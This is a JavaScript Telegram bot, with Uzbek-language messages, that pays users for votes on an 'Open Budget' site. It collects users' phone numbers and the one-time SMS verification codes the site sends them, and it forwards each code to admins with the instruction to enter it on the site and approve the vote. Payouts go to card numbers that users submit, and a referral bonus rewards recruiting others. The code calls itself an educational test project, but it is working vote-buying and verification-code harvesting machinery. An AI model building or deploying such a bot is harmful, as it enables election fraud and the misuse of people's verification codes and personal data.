const { Telegraf, Markup } = require('telegraf');
const config = require('./config');
const db = require('./db');

const bot = new Telegraf(config.BOT_TOKEN);

// Memory storage for user states
const userStates = {};

const getViewState = (userId) => userStates[userId] || null;
const setViewState = (userId, state, data = {}) => {
  userStates[userId] = { state, data };
};
const clearViewState = (userId) => {
  delete userStates[userId];
};

const isAdmin = async (userId) => {
  return await db.isAdmin(userId);
};

// Keyboard helpers
const mainMenuKeyboard = () => {
  return Markup.keyboard([
    ['🗳️ Ovoz berish', '👤 Kabinet'],
    ['🔗 Takliflar', '💰 Pul yechish'],
    ['🏆 Top Reyting', 'ℹ️ Ma'lumot']
  ]).resize();
};

const adminMenuKeyboard = () => {
  return Markup.keyboard([
    ['📊 Statistika', '⚙️ Sozlamalar'],
    ['🗳️ Kutilayotgan Ovozlar', '💰 Yechish So'rovlari'],
    ['📢 Xabar yuborish', '🚪 Chiqish']
  ]).resize();
};

// --- USER COMMANDS ---

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username || null;
  const firstName = ctx.from.first_name;
  
  // Check referral from start payload
  let referredBy = null;
  const payload = ctx.startPayload; // Telegraf parses /start <payload>
  if (payload) {
    const parsed = parseInt(payload);
    if (!isNaN(parsed)) {
      referredBy = parsed;
    }
  }

  await db.addUser(userId, username, firstName, referredBy);
  clearViewState(userId);

  // Auto-admin assignment for testing if no admins exist
  const currentAdmins = await db.getAdmins();
  let isNowAdmin = false;
  if (currentAdmins.length === 0) {
    await db.addAdmin(userId);
    isNowAdmin = true;
  }

  const projectUrl = await db.getSetting('project_url', config.DEFAULT_PROJECT_URL);
  let welcomeText = 
    `Assalomu alaykum, ${firstName}!\n\n` +
    `**Open Budget Simulator** botiga xush kelibsiz.\n` +
    `Bu yerda siz veb-sayt yoki bot orqali ovoz berib pul ishlashingiz mumkin.\n\n` +
    `🔗 Bizning test saytimiz: ${projectUrl}\n\n` +
    `Boshlash uchun quyidagi menyudan foydalaning👇`;

  if (isNowAdmin) {
    welcomeText += "\n\n👑 **Siz botning birinchi foydalanuvchisi bo'lganingiz uchun avtomatik tarzda ADMIN bo'ldingiz!** Admin paneliga o'tish uchun /admin komandasini bosing.";
  }

  await ctx.replyWithMarkdown(welcomeText, mainMenuKeyboard());
});

bot.command('admin', async (ctx) => {
  const userId = ctx.from.id;
  if (!(await isAdmin(userId))) {
    return ctx.reply("❌ Siz admin emassiz.");
  }
  await ctx.reply("⚙️ Admin paneliga xush kelibsiz. Kerakli bo'limni tanlang:", adminMenuKeyboard());
});

// --- USER ACTIONS ---

bot.hears('🗳️ Ovoz berish', async (ctx) => {
  const userId = ctx.from.id;

  // Check if bot is active
  const isActive = await db.getSetting("is_bot_active", "True");
  if (isActive !== "True") {
    return ctx.reply("⚠️ Hozirda bot vaqtincha to'xtatilgan. Ovoz berish qabul qilinmaydi.");
  }

  // Check if active vote pending
  const hasActive = await db.checkActiveVoteExists(userId);
  if (hasActive) {
    return ctx.reply("⚠️ Sizda faol ovoz berish so'rovi bor. Iltimos, uni yakunlang yoki admin tasdiqlashini kuting.");
  }

  setViewState(userId, 'waiting_for_phone');

  const projectUrl = await db.getSetting('project_url', config.DEFAULT_PROJECT_URL);
  const voteReward = await db.getSetting('vote_reward', String(config.VOTE_REWARD));

  const instruction = 
    `🗳️ **Ovoz berish bo'limi**\n\n` +
    `Siz bot orqali yoki veb-saytda ovoz berishingiz mumkin.\n` +
    `🔗 Sayt orqali ovoz berish: [Sayt havolasi](${projectUrl})\n\n` +
    `Ovoz tasdiqlangach sizga **{vote_reward} so'm** beriladi.\n\n` +
    `**Bot orqali** ovoz berishni boshlash uchun quyidagi **'📱 Telefon raqamni yuborish'** tugmasini bosing yoki telefon raqamingizni \`+998XXXXXXXXX\` formatida yozib yuboring:`;

  const inlineKeyboard = Markup.keyboard([
    [Markup.button.contactRequest("📱 Telefon raqamni yuborish")],
    ['❌ Bekor qilish']
  ]).resize().oneTime();

  await ctx.replyWithMarkdown(instruction.replace('{vote_reward}', voteReward), inlineKeyboard);
});

bot.hears('👤 Kabinet', async (ctx) => {
  const userId = ctx.from.id;
  const user = await db.getUser(userId);
  if (!user) return;

  const successfulVotes = await db.getUserSuccessfulVotesCount(userId);
  const refCount = await db.getReferralCount(userId);
  const phoneStr = user.phone_number ? user.phone_number : "Kiritilmagan";

  const cabinetText = 
    `👤 **Sizning hisobingiz**\n\n` +
    `🆔 ID: \`${user.user_id}\`\n` +
    `🏷️ Ism: ${user.first_name}\n` +
    `📱 Ulangan telefon: \`${phoneStr}\`\n` +
    `💵 Balans: **${user.balance} so'm**\n\n` +
    `🗳️ Muvaffaqiyatli ovozlaringiz: ${successfulVotes} ta\n` +
    `👥 Taklif qilgan do'stlaringiz: ${refCount} ta`;

  await ctx.replyWithMarkdown(cabinetText);
});

bot.hears('🔗 Takliflar', async (ctx) => {
  const userId = ctx.from.id;
  const botInfo = await bot.telegram.getMe();
  const refLink = `https://t.me/${botInfo.username}?start=${userId}`;
  const refReward = await db.getSetting('referral_reward', String(config.REFERRAL_REWARD));

  const refText = 
    `🔗 **Takliflar tizimi**\n\n` +
    `Do'stlaringizni botga taklif qiling. Ular bot yoki sayt orqali ovoz berib, ovozi tasdiqlangandan so'ng, sizga **${refReward} so'm** bonus beriladi!\n\n` +
    `Sizning referal havolangiz:\n\`${refLink}\`\n\n` +
    `Havolani nusxalab, do'stlaringizga yuboring!`;

  await ctx.replyWithMarkdown(refText);
});

bot.hears('💰 Pul yechish', async (ctx) => {
  const userId = ctx.from.id;
  const user = await db.getUser(userId);
  const minWithdraw = parseInt(await db.getSetting('min_withdraw', String(config.MIN_WITHDRAW)));

  if (user.balance < minWithdraw) {
    return ctx.replyWithMarkdown(
      `❌ Balansingiz yetarli emas.\n` +
      `Minimal yechib olish miqdori: **${minWithdraw} so'm**\n` +
      `Sizning balansingiz: **${user.balance} so'm**`
    );
  }

  setViewState(userId, 'waiting_for_card');
  const cancelKeyboard = Markup.keyboard([['❌ Bekor qilish']]).resize();

  await ctx.replyWithMarkdown(
    `💳 Pul o'tkaziladigan karta raqami va karta egasining ismini kiriting:\n\n` +
    `Masalan: \`8600123456789012 Eshmatov Toshmat\``,
    cancelKeyboard
  );
});

bot.hears('🏆 Top Reyting', async (ctx) => {
  const userId = ctx.from.id;
  const topVoters = await db.getTopVoters(10);
  const topReferrers = await db.getTopReferrers(10);

  let text = "🏆 **Open Budget Simulator Reytingi**\n\n";

  text += "🗳️ **Eng ko'p ovoz berganlar (Top 10):**\n";
  if (topVoters.length === 0) {
    text += "  _Hozircha ma'lumot yo'q_\n";
  } else {
    topVoters.forEach((v, index) => {
      const userStr = v.username !== "Yashirin" ? `@${v.username}` : v.first_name;
      text += `${index + 1}. ${userStr} — **${v.vote_count} ta** ovoz\n`;
    });
  }

  text += "\n👥 **Eng ko'p do'st taklif qilganlar (Top 10):**\n";
  if (topReferrers.length === 0) {
    text += "  _Hozircha ma'lumot yo'q_\n";
  } else {
    topReferrers.forEach((r, index) => {
      const userStr = r.username !== "Yashirin" ? `@${r.username}` : r.first_name;
      text += `${index + 1}. ${userStr} — **${r.ref_count} ta** do'st\n`;
    });
  }

  await ctx.replyWithMarkdown(text);
});

bot.hears('ℹ️ Ma'lumot', async (ctx) => {
  const userId = ctx.from.id;
  const projectUrl = await db.getSetting('project_url', config.DEFAULT_PROJECT_URL);
  const voteReward = await db.getSetting('vote_reward', String(config.VOTE_REWARD));
  const refReward = await db.getSetting('referral_reward', String(config.REFERRAL_REWARD));
  const minWithdraw = await db.getSetting('min_withdraw', String(config.MIN_WITHDRAW));

  const infoText = 
    `ℹ️ **Loyiha haqida ma'lumot**\n\n` +
    `Bu o'quv-test loyihasi bo'lib, **Open Budget** saytlari va Telegram botlari qanday ishlashini ko'rsatadi.\n\n` +
    `💵 **Tariflar:**\n` +
    `• Har bir ovoz uchun: **${voteReward} so'm**\n` +
    `• Har bir taklif (referal) uchun: **${refReward} so'm**\n` +
    `• Minimal pul yechish: **${minWithdraw} so'm**\n\n` +
    `🗳️ **Ovoz berish usullari:**\n` +
    `1. Veb-saytga kiring va telefon raqamingizni yozing.\n` +
    `2. Agar shu telefon raqamingiz Telegram botga ulangan bo'lsa, bot sizga tasdiqlash kodini yuboradi. Agar ulanmagan bo'lsa, kod bot adminlariga boradi.\n` +
    `3. Kodni saytga kiriting va ovozni tasdiqlang.\n\n` +
    `🔗 Veb-sayt: ${projectUrl}`;

  await ctx.replyWithMarkdown(infoText, { disable_web_page_preview: true });
});

// --- ADMIN MENU HANDLERS ---

const handleAdminMessages = async (ctx) => {
  const text = ctx.message.text;
  const userId = ctx.from.id;

  if (text === "📊 Statistika") {
    const stats = await db.getStats();
    const statsText = 
      `📊 **Bot Statistikasi:**\n\n` +
      `👥 Jami a'zolar: ${stats.total_users} ta\n` +
      `✅ Tasdiqlangan ovozlar: ${stats.approved_votes} ta\n` +
      `⏳ Kutilayotgan ovozlar: ${stats.pending_votes} ta\n\n` +
      `💰 To'lab berilgan pul: ${stats.total_withdrawn} so'm\n` +
      `⏳ To'lov kutilayotgan pul: ${stats.pending_withdrawn} so'm`;
    await ctx.replyWithMarkdown(statsText);
  } 
  
  else if (text === "⚙️ Sozlamalar") {
    const url = await db.getSetting("project_url", config.DEFAULT_PROJECT_URL);
    const voteReward = await db.getSetting("vote_reward", String(config.VOTE_REWARD));
    const refReward = await db.getSetting("referral_reward", String(config.REFERRAL_REWARD));
    const minWithdraw = await db.getSetting("min_withdraw", String(config.MIN_WITHDRAW));
    const isActive = await db.getSetting("is_bot_active", "True");
    
    const statusStr = isActive === "True" ? "🟢 Faol" : "🔴 To'xtatilgan";

    const settingsText = 
      `⚙️ **Tizim Sozlamalari:**\n\n` +
      `🔗 Loyiha URL: ${url}\n` +
      `💵 Ovoz haqi: ${voteReward} so'm\n` +
      `👥 Referal bonus: ${refReward} so'm\n` +
      `💰 Minimal yechish: ${minWithdraw} so'm\n` +
      `🤖 Bot holati: ${statusStr}`;

    const inlineKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback("🔗 Loyiha havolasini o'zgartirish", "admin_set_url")],
      [Markup.button.callback("💵 Ovoz to'lovini o'zgartirish", "admin_set_vote")],
      [Markup.button.callback("👥 Referal bonusni o'zgartirish", "admin_set_ref")],
      [Markup.button.callback("💰 Minimal yechishni o'zgartirish", "admin_set_min")],
      [Markup.button.callback("🤖 Botni Yoqish / O'chirish", "admin_toggle_bot")]
    ]);

    await ctx.replyWithMarkdown(settingsText, inlineKeyboard);
  } 
  
  else if (text === "🗳️ Kutilayotgan Ovozlar") {
    const votes = await db.getPendingVotes();
    if (votes.length === 0) {
      return ctx.reply("⏳ Hozirda kutilayotgan ovozlar yo'q.");
    }
    
    await ctx.reply(`⏳ Kutilayotgan jami ovozlar: ${votes.length} ta. Ro'yxat quyida:`);
    
    // Display top 10
    for (const vote of votes.slice(0, 10)) {
      const smsStr = vote.sms_code ? vote.sms_code : "Kutilmoqda...";
      const statusEmoji = vote.status === "pending_sms" ? "🔑" : "📱";
      
      const vText = 
        `🗳️ **Ovoz #${vote.id}**\n` +
        `👤 User ID: \`${vote.user_id}\`\n` +
        `📱 Telefon: \`${vote.phone_number}\`\n` +
        `${statusEmoji} SMS kod: \`${smsStr}\`\n` +
        `⏰ Yaratilgan vaqt: ${vote.created_at}`;

      const inlineKeyboard = Markup.inlineKeyboard([
        Markup.button.callback("✅ Tasdiqlash", `approve_vote_${vote.id}`),
        Markup.button.callback("❌ Rad etish", `reject_vote_${vote.id}`)
      ]);

      await ctx.replyWithMarkdown(vText, inlineKeyboard);
    }
  } 
  
  else if (text === "💰 Yechish So'rovlari") {
    const withdrawals = await db.getPendingWithdrawals();
    if (withdrawals.length === 0) {
      return ctx.reply("💰 Hozircha pul yechish so'rovlari mavjud emas.");
    }
    
    await ctx.reply(`💰 Kutilayotgan jami so'rovlar: ${withdrawals.length} ta:`);
    
    for (const w of withdrawals.slice(0, 10)) {
      const wText = 
        `💰 **Pul yechish #${w.id}**\n` +
        `👤 User ID: \`${w.user_id}\`\n` +
        `💳 Karta: \`${w.card_number}\`\n` +
        `💵 Miqdor: **${w.amount} so'm**\n` +
        `⏰ Vaqt: ${w.created_at}`;

      const inlineKeyboard = Markup.inlineKeyboard([
        Markup.button.callback("✅ To'landi", `approve_withdraw_${w.id}`),
        Markup.button.callback("❌ Rad etish", `reject_withdraw_${w.id}`)
      ]);

      await ctx.replyWithMarkdown(wText, inlineKeyboard);
    }
  } 
  
  else if (text === "📢 Xabar yuborish") {
    setViewState(userId, 'admin_broadcasting');
    await ctx.reply("📢 Foydalanuvchilarga yubormoqchi bo'lgan xabaringiz matnini kiriting:", Markup.keyboard([['❌ Bekor qilish']]).resize());
  } 
  
  else if (text === "🚪 Chiqish") {
    await ctx.reply("Foydalanuvchi menyusi.", mainMenuKeyboard());
  }
};

// --- STATE HANDLERS ---

bot.on('message', async (ctx) => {
  const userId = ctx.from.id;
  const viewState = getViewState(userId);

  if (!viewState) {
    if (await isAdmin(userId) && ctx.message.text) {
      await handleAdminMessages(ctx);
    }
    return;
  }

  // Cancel check
  if (ctx.message.text === "❌ Bekor qilish") {
    clearViewState(userId);
    return ctx.reply("Jarayon bekor qilindi.", mainMenuKeyboard());
  }

  const { state, data } = viewState;

  if (state === 'waiting_for_phone') {
    let phone = null;
    if (ctx.message.contact) {
      phone = ctx.message.contact.phone_number;
    } else if (ctx.message.text) {
      phone = ctx.message.text.trim();
    }

    if (!phone) {
      return ctx.reply("⚠️ Iltimos, telefon raqamingizni yuboring.");
    }

    // Clean phone number format
    phone = phone.replace(/\s+/g, '').replace(/-/g, '');
    if (!phone.startsWith('+')) {
      if (phone.startsWith('998')) {
        phone = '+' + phone;
      } else if (phone.length === 9 && /^\d+$/.test(phone)) {
        phone = '+998' + phone;
      } else {
        return ctx.reply("⚠️ Telefon raqam noto'g'ri shaklda. Iltimos, qaytadan yuboring (Masalan: +998901234567).");
      }
    }

    // Validation
    if (!(phone.startsWith('+998') && phone.length === 13 && /^\d+$/.test(phone.substring(1)))) {
      return ctx.reply("⚠️ Faqat O'zbekiston raqamlari qabul qilinadi (+998XXXXXXXXX). Qaytadan urinib ko'ring.");
    }

    // Check if voted successfully already
    if (await db.checkPhoneVotedAlready(phone)) {
      clearViewState(userId);
      return ctx.reply("❌ Bu telefon raqam orqali avvalroq ovoz berilgan. Boshqa raqamdan foydalaning.", mainMenuKeyboard());
    }

    // Save phone to user profile
    await db.updateUserPhone(userId, phone);

    // Add vote to DB
    const voteId = await db.addVote(userId, phone);
    
    // Move to waiting for SMS
    setViewState(userId, 'waiting_for_sms', { vote_id: voteId, phone });

    await ctx.reply(
      `✅ Telefon raqamingiz (${phone}) qabul qilindi va Telegram profilingizga ulandi!\n\n` +
      `Tez orada ushbu raqamga **openbudget**dan 6 ta raqamli tasdiqlash kodi yuboriladi.\n` +
      `Kodni olganingizdan so'ng, uni botga yozib yuboring:`,
      Markup.keyboard([['❌ Bekor qilish']]).resize()
    );

    // Notify Admins
    await notifyAdminsNewPhone(voteId, userId, ctx.from.first_name, phone);
  } 
  
  else if (state === 'waiting_for_sms') {
    const smsCode = ctx.message.text;
    if (!smsCode || !/^\d+$/.test(smsCode.trim())) {
      return ctx.reply("⚠️ SMS kod faqat raqamlardan iborat bo'lishi kerak. Iltimos, qaytadan yuboring:");
    }

    const { vote_id: voteId, phone } = data;
    await db.updateVoteSms(voteId, smsCode.trim());
    clearViewState(userId);

    await ctx.reply(
      "✅ SMS kod qabul qilindi va tekshirishga yuborildi!\n" +
      "Admin ovozni tasdiqlashi bilan hisobingizga pul o'tkaziladi. Bu bir necha daqiqa olishi mumkin.",
      mainMenuKeyboard()
    );

    // Notify admins
    await notifyAdminsSmsCode(voteId, userId, ctx.from.first_name, phone, smsCode.trim());
  } 
  
  else if (state === 'waiting_for_card') {
    const cardDetails = ctx.message.text;
    if (!cardDetails || cardDetails.trim().length < 16) {
      return ctx.reply("⚠️ Karta raqami noto'g'ri kiritilgan ko'rinadi. Iltimos, to'liq va to'g'ri kiriting:");
    }

    setViewState(userId, 'waiting_for_amount', { card: cardDetails });
    const user = await db.getUser(userId);

    await ctx.reply(
      `💵 Qancha pul yechmoqchisiz?\n` +
      `Sizning balansingiz: **${user.balance} so'm**\n` +
      `Yechib olmoqchi bo'lgan miqdoringizni faqat raqamlarda yozing:`
    );
  } 
  
  else if (state === 'waiting_for_amount') {
    const amountText = ctx.message.text;
    if (!amountText || !/^\d+$/.test(amountText.trim())) {
      return ctx.reply("⚠️ Iltimos, miqdorni faqat butun raqamlarda kiriting:");
    }

    const amount = parseInt(amountText.trim());
    const user = await db.getUser(userId);
    const minWithdraw = parseInt(await db.getSetting("min_withdraw", String(config.MIN_WITHDRAW)));
    const { card } = data;

    if (amount > user.balance) {
      return ctx.reply(`❌ Hisobingizda mablag' yetarli emas. Balansingiz: ${user.balance} so'm. Qayta urinib ko'ring:`);
    }

    if (amount < minWithdraw) {
      return ctx.reply(`❌ Minimal yechish miqdori ${minWithdraw} so'm. Boshqa miqdor kiriting:`);
    }

    const withdrawId = await db.addWithdrawal(userId, card, amount);
    clearViewState(userId);

    await ctx.replyWithMarkdown(
      `✅ Pul yechish so'rovingiz qabul qilindi!\n` +
      `Mablag': **${amount} so'm**\n` +
      `Karta: \`${card}\`\n` +
      `Tez orada operator pullarni kartangizga o'tkazib beradi.`,
      mainMenuKeyboard()
    );

    // Notify admins
    await notifyAdminsWithdrawal(withdrawId, userId, ctx.from.first_name, card, amount);
  }

  // Admin settings inputs
  else if (state === 'admin_setting_project_url' && await isAdmin(userId)) {
    const url = ctx.message.text.trim();
    await db.setSetting("project_url", url);
    clearViewState(userId);
    await ctx.reply(`✅ Loyiha havolasi muvaffaqiyatli o'zgartirildi:\n${url}`, adminMenuKeyboard());
  }

  else if (state === 'admin_setting_vote_reward' && await isAdmin(userId)) {
    const val = ctx.message.text.trim();
    if (!/^\d+$/.test(val)) return ctx.reply("⚠️ Faqat raqam kiriting:");
    await db.setSetting("vote_reward", val);
    clearViewState(userId);
    await ctx.reply(`✅ Ovoz berish uchun mukofot ${val} so'm qilib belgilandi.`, adminMenuKeyboard());
  }

  else if (state === 'admin_setting_ref_reward' && await isAdmin(userId)) {
    const val = ctx.message.text.trim();
    if (!/^\d+$/.test(val)) return ctx.reply("⚠️ Faqat raqam kiriting:");
    await db.setSetting("referral_reward", val);
    clearViewState(userId);
    await ctx.reply(`✅ Taklif (referal) uchun mukofot ${val} so'm qilib belgilandi.`, adminMenuKeyboard());
  }

  else if (state === 'admin_setting_min_withdraw' && await isAdmin(userId)) {
    const val = ctx.message.text.trim();
    if (!/^\d+$/.test(val)) return ctx.reply("⚠️ Faqat raqam kiriting:");
    await db.setSetting("min_withdraw", val);
    clearViewState(userId);
    await ctx.reply(`✅ Minimal yechib olish miqdori ${val} so'm qilib belgilandi.`, adminMenuKeyboard());
  }

  else if (state === 'admin_broadcasting' && await isAdmin(userId)) {
    const broadcastText = ctx.message.text;
    clearViewState(userId);
    await ctx.reply("📢 Xabarni barcha foydalanuvchilarga tarqatish boshlandi...", adminMenuKeyboard());

    const users = await db.getAllUsersList();
    let success = 0;
    let failed = 0;

    for (const uid of users) {
      try {
        await bot.telegram.sendMessage(uid, broadcastText);
        success++;
      } catch (err) {
        failed++;
      }
    }

    await ctx.reply(`📢 Tarqatish yakunlandi.\n✅ Yetkazildi: ${success} ta foydalanuvchiga\n❌ Yetkazilmadi: ${failed} ta foydalanuvchiga`);
  }
});

// --- ADMIN NOTIFICATION HELPERS ---

const notifyAdminsNewPhone = async (voteId, userId, firstName, phone) => {
  const text = 
    `🔔 **Yangi Ovoz Berish (#Phone)**\n\n` +
    `🆔 ID: \`${voteId}\`\n` +
    `👤 Foydalanuvchi: ${firstName} (ID: \`${userId}\`)\n` +
    `📱 Telefon: \`${phone}\`\n\n` +
    `Foydalanuvchi hozir SMS kodni kiritishi kutilmoqda...`;

  const inlineKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("❌ Rad etish (Bekor qilish)", `reject_vote_${voteId}`)
  ]);

  const admins = await db.getAdmins();
  for (const adminId of admins) {
    try {
      await bot.telegram.sendMessage(adminId, text, { parse_mode: 'Markdown', ...inlineKeyboard });
    } catch (e) {}
  }
};

const notifyAdminsSmsCode = async (voteId, userId, firstName, phone, smsCode) => {
  const text = 
    `🗳️ **SMS kod keldi (Ovoz #${voteId})**\n\n` +
    `👤 Foydalanuvchi: ${firstName} (ID: \`${userId}\`)\n` +
    `📱 Telefon: \`${phone}\`\n` +
    `🔑 SMS kod: \`${smsCode}\`\n\n` +
    `Iltimos, kodni saytga kiriting va tasdiqlang.`;

  const inlineKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("✅ Ovoz o'tdi", `approve_vote_${voteId}`),
    Markup.button.callback("❌ Rad etish", `reject_vote_${voteId}`)
  ]);

  const admins = await db.getAdmins();
  for (const adminId of admins) {
    try {
      await bot.telegram.sendMessage(adminId, text, { parse_mode: 'Markdown', ...inlineKeyboard });
    } catch (e) {}
  }
};

const notifyAdminsWithdrawal = async (withdrawId, userId, firstName, card, amount) => {
  const text = 
    `💰 **Pul yechish so'rovi #${withdrawId}**\n\n` +
    `👤 Foydalanuvchi: ${firstName} (ID: \`${userId}\`)\n` +
    `💳 Karta: \`${card}\`\n` +
    `💵 Miqdor: **${amount} so'm**\n\n` +
    `Karta hisobiga pul o'tkazing va tasdiqlang.`;

  const inlineKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("✅ To'landi", `approve_withdraw_${withdrawId}`),
    Markup.button.callback("❌ Rad etish", `reject_withdraw_${withdrawId}`)
  ]);

  const admins = await db.getAdmins();
  for (const adminId of admins) {
    try {
      await bot.telegram.sendMessage(adminId, text, { parse_mode: 'Markdown', ...inlineKeyboard });
    } catch (e) {}
  }
};

// --- CALLBACK QUERY ACTIONS ---

bot.on('callback_query', async (ctx) => {
  const userId = ctx.from.id;
  if (!(await isAdmin(userId))) {
    return ctx.answerCbQuery("❌ Siz admin emassiz.");
  }

  const data = ctx.callbackQuery.data;
  const message = ctx.callbackQuery.message;

  // --- Vote Actions ---
  if (data.startsWith('approve_vote_')) {
    const voteId = parseInt(data.split('_')[2]);
    const vote = await db.getVote(voteId);

    if (!vote || ['approved', 'rejected'].includes(vote.status)) {
      return ctx.answerCbQuery("⚠️ Bu ovoz allaqachon tasdiqlangan yoki rad etilgan.");
    }

    await db.updateVoteStatus(voteId, 'approved');

    const voteReward = parseInt(await db.getSetting("vote_reward", String(config.VOTE_REWARD)));
    const refReward = parseInt(await db.getSetting("referral_reward", String(config.REFERRAL_REWARD)));

    if (vote.user_id) {
      await db.updateBalance(vote.user_id, voteReward);
      try {
        await bot.telegram.sendMessage(
          vote.user_id,
          `🎉 Tabriklaymiz! Siz yuborgan \`${vote.phone_number}\` raqamidagi ovoz tasdiqlandi.\n` +
          `Balansingizga **${voteReward} so'm** qo'shildi!`
        );
      } catch (e) {}

      // Reward referrer
      const user = await db.getUser(vote.user_id);
      if (user && user.referred_by) {
        await db.updateBalance(user.referred_by, refReward);
        try {
          await bot.telegram.sendMessage(
            user.referred_by,
            `👥 Siz taklif qilgan ${user.first_name} muvaffaqiyatli ovoz berdi.\n` +
            `Sizga **${refReward} so'm** referal bonus berildi!`
          );
        } catch (e) {}
      }
    }

    await ctx.answerCbQuery("✅ Ovoz tasdiqlandi!");
    await ctx.editMessageText(
      message.text + `\n\n✅ **Tasdiqlandi (Admin ID: ${userId})**`
    );
  } 
  
  else if (data.startsWith('reject_vote_')) {
    const voteId = parseInt(data.split('_')[2]);
    const vote = await db.getVote(voteId);

    if (!vote || ['approved', 'rejected'].includes(vote.status)) {
      return ctx.answerCbQuery("⚠️ Bu ovoz allaqachon tasdiqlangan yoki rad etilgan.");
    }

    await db.updateVoteStatus(voteId, 'rejected');

    if (vote.user_id) {
      try {
        await bot.telegram.sendMessage(
          vote.user_id,
          `❌ Siz yuborgan \`${vote.phone_number}\` raqamidagi ovoz rad etildi.\n` +
          `Sababi: Ovoz rasmiy saytdan o'tmadi yoki noto'g'ri kod yuborildi.`
        );
      } catch (e) {}
    }

    await ctx.answerCbQuery("❌ Ovoz rad etildi.");
    await ctx.editMessageText(
      message.text + `\n\n❌ **Rad etildi (Admin ID: ${userId})**`
    );
  }

  // --- Withdrawal Actions ---
  else if (data.startsWith('approve_withdraw_')) {
    const withdrawId = parseInt(data.split('_')[2]);
    const w = await db.getWithdrawal(withdrawId);

    if (!w || ['approved', 'rejected'].includes(w.status)) {
      return ctx.answerCbQuery("⚠️ Bu so'rov allaqachon bajarilgan.");
    }

    await db.updateWithdrawalStatus(withdrawId, 'approved');

    if (w.user_id) {
      try {
        await bot.telegram.sendMessage(
          w.user_id,
          `✅ **Pul yechish tasdiqlandi!**\n` +
          `Karta: \`${w.card_number}\`\n` +
          `Miqdor: **${w.amount} so'm**\n` +
          `Pullar kartangizga to'liq o'tkazib berildi.`
        );
      } catch (e) {}
    }

    await ctx.answerCbQuery("✅ To'lov tasdiqlandi!");
    await ctx.editMessageText(
      message.text + `\n\n✅ **To'lab berildi (Admin ID: ${userId})**`
    );
  }

  else if (data.startsWith('reject_withdraw_')) {
    const withdrawId = parseInt(data.split('_')[2]);
    const w = await db.getWithdrawal(withdrawId);

    if (!w || ['approved', 'rejected'].includes(w.status)) {
      return ctx.answerCbQuery("⚠️ Bu so'rov allaqachon bajarilgan.");
    }

    await db.updateWithdrawalStatus(withdrawId, 'rejected');

    if (w.user_id) {
      try {
        await bot.telegram.sendMessage(
          w.user_id,
          `❌ **Pul yechish rad etildi!**\n` +
          `Miqdor: **${w.amount} so'm**\n` +
          `Mablag' qayta balansingizga qaytarildi. Karta ma'lumotlarini tekshiring.`
        );
      } catch (e) {}
    }

    await ctx.answerCbQuery("❌ Pul yechish rad etildi, pul qaytarildi.");
    await ctx.editMessageText(
      message.text + `\n\n❌ **Rad etildi (Mablag' qaytarildi) (Admin ID: ${userId})**`
    );
  }

  // --- Setting Actions ---
  else if (data === 'admin_set_url') {
    setViewState(userId, 'admin_setting_project_url');
    await ctx.reply("🔗 Yangi loyiha havolasini (URL) yuboring:");
    await ctx.answerCbQuery();
  }

  else if (data === 'admin_set_vote') {
    setViewState(userId, 'admin_setting_vote_reward');
    await ctx.reply("💵 Bitta tasdiqlangan ovoz uchun to'lov miqdorini kiriting (UZS da, faqat raqam):");
    await ctx.answerCbQuery();
  }

  else if (data === 'admin_set_ref') {
    setViewState(userId, 'admin_setting_ref_reward');
    await ctx.reply("👥 Referal taklif qilganligi uchun bonus miqdorini kiriting (UZS da, faqat raqam):");
    await ctx.answerCbQuery();
  }

  else if (data === 'admin_set_min') {
    setViewState(userId, 'admin_setting_min_withdraw');
    await ctx.reply("💰 Minimal pul yechish miqdorini kiriting (UZS da, faqat raqam):");
    await ctx.answerCbQuery();
  }

  else if (data === 'admin_toggle_bot') {
    const isActive = await db.getSetting("is_bot_active", "True");
    const newVal = isActive === "True" ? "False" : "True";
    await db.setSetting("is_bot_active", newVal);

    const statusStr = newVal === "True" ? "🟢 Faol" : "🔴 To'xtatilgan";
    await ctx.reply(`🤖 Bot holati o'zgartirildi: ${statusStr}`);
    await ctx.answerCbQuery(`Bot holati: ${statusStr}`);
  }
});

module.exports = bot;
